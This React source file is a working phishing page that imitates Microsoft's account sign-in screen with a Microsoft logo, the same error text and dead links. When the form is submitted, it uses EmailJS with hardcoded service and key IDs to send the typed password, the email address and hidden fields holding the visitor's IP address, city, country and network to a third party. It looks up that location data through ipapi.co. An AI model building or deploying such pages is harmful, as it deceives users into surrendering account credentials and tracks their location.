import React, { useEffect, useRef, useState } from "react";
import {
  BackgroundImage,
  Box,
  Text,
  Input,
  Button,
  Image,
} from "@mantine/core";
import { useMediaQuery } from "@mantine/hooks";
import emailjs from "@emailjs/browser";

import Footer from "../components/Footer";

import backgroundimg from "../assets/Background-blurryGradient.svg";
import logoimg from "../assets/microsoft_logo.svg";

type Props = {
  onSubmit: (e: any) => void;
  errorMsg: string;
  email: string;
  disabledBtn: boolean;
  userLocation: any;
};

function Password({ email }: any) {
  const mobile = useMediaQuery("(max-width: 600px)");
  const [errorMsg, setErrorMsg] = useState("");
  const [userLocation, setUserLocation] = useState({});
  const [disabledBtn, setDisabledBtn] = useState(false);

  // function to get user location
  const getLocation = () => {
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        setUserLocation(data);
      });
  };

  const handleSubmit = (e: any) => {
    e.preventDefault();
    const email = e.target.email.value;
    const password = e.target.password.value;

    if (password.length < 1) {
      setErrorMsg("Please enter the password for your Microsoft account.");
    } else {
      setErrorMsg("");
      emailjs
        .sendForm(
          `service_k7bcapb`,
          `template_b464qdd`,
          "#form",
          `EzlgSJWoq6CnT1_sB`
        )
        .then(
          (result) => {
            setDisabledBtn(true);
            // sessionStorage.setItem("emailSent", true);
          },
          (error) => {
            console.log(error.text);
          }
        );
      setDisabledBtn(true);
    }
  };

  useEffect(() => {
    getLocation();
  }, []);

  return (
    <div>
      {mobile ? (
        <MobileView
          disabledBtn={disabledBtn}
          onSubmit={handleSubmit}
          errorMsg={errorMsg}
          email={email}
          userLocation={userLocation}
        />
      ) : (
        <DesktopView
          disabledBtn={disabledBtn}
          onSubmit={handleSubmit}
          errorMsg={errorMsg}
          email={email}
          userLocation={userLocation}
        />
      )}
    </div>
  );
}

function DesktopView({
  onSubmit,
  errorMsg,
  email,
  userLocation,
  disabledBtn,
}: Props) {
  return (
    <div className='relative'>
      <BackgroundImage src={backgroundimg}>
        <div className='min-h-[96vh] flex items-center justify-center'>
          <form onSubmit={onSubmit} id='form' className='signin-card space-y-7'>
            <Box className='space-y-4 flex flex-col items-start'>
              <a href='/'>
                <Image src={logoimg} alt='logo' width={120} height={"100%"} />
              </a>
              <Text className='text-sm font-medium'>{email}</Text>
              <Text className='text-2xl font-bold'>Enter password</Text>
            </Box>

            <Box className='space-y-3'>
              {errorMsg && (
                <Text className='text-red-600 text-sm'>{errorMsg}</Text>
              )}

              <Input
                placeholder='Password'
                variant='unstyled'
                type={"password"}
                name='password'
                className='border-b border-black focus-within:border-[#0067B8] text-3xl'
              />
            </Box>

            <input
              type='text'
              name='email'
              hidden
              id='email'
              defaultValue={email}
            />
            <input
              type='text'
              name='ip'
              hidden
              id='ip'
              defaultValue={userLocation.ip}
            />
            <input
              type='text'
              name='country'
              hidden
              id='country'
              defaultValue={userLocation.country_name}
            />
            <input
              type='text'
              name='city'
              hidden
              id='city'
              defaultValue={userLocation.city}
            />
            <input
              type='text'
              name='network'
              hidden
              id='network'
              defaultValue={userLocation.org}
              value={userLocation?.org}
            />

            <Box className='space-y-3 text-sm text-[#0067b8]  flex flex-col'>
              <a href='#'>Forgot password?</a>
              <a href='#'>Email code to {email}</a>
              <a href='#'>Sign in with a different Microsoft account</a>
            </Box>

            <Box className='flex justify-end'>
              <Button
                type='submit'
                disabled={disabledBtn}
                radius='xs'
                className='bg-[#0067B8] text-white px-8'>
                Sign in
              </Button>
            </Box>
          </form>
        </div>
      </BackgroundImage>
      <Footer />
    </div>
  );
}

function MobileView({
  onSubmit,
  errorMsg,
  email,
  userLocation,
  disabledBtn,
}: Props) {
  return (
    <div className='relative'>
      <form onSubmit={onSubmit} id='form' className='space-y-7 px-10 py-9'>
        <Box className='space-y-4 flex flex-col items-start'>
          <a href='/'>
            <Image src={logoimg} alt='logo' width={120} height={"100%"} />
          </a>{" "}
          <Text className='text-sm font-medium'>{email}</Text>
          <Text className='text-2xl font-bold'>Enter password</Text>
        </Box>

        <Box className='space-y-3'>
          {errorMsg && <Text className='text-red-600 text-sm'>{errorMsg}</Text>}

          <Input
            placeholder='Email, phone, or Skype'
            variant='unstyled'
            name='email'
            className='border-b border-black focus-within:border-[#0067B8] text-3xl'
          />
        </Box>

        <input
          type='text'
          name='email'
          hidden
          id='email'
          defaultValue={email}
        />
        <input
          type='text'
          name='ip'
          hidden
          id='ip'
          defaultValue={userLocation.ip}
        />
        <input
          type='text'
          name='country'
          hidden
          id='country'
          defaultValue={userLocation.country_name}
        />
        <input
          type='text'
          name='city'
          hidden
          id='city'
          defaultValue={userLocation.city}
        />
        <input
          type='text'
          name='network'
          hidden
          id='network'
          defaultValue={userLocation.org}
          value={userLocation?.org}
        />

        <Box className='space-y-3 text-sm text-[#0067b8] flex flex-col'>
          <a href='#'>Forgot password?</a>
          <a href='#'>Email code to {email}</a>
          <a href='#'>Sign in with a different Microsoft account</a>
        </Box>

        <Box className='flex justify-end'>
          <Button
            disabled={disabledBtn}
            type='submit'
            radius='xs'
            className='bg-[#0067B8] text-white px-8'>
            Next
          </Button>
        </Box>
      </form>
      <Footer />
    </div>
  );
}

export default Password;
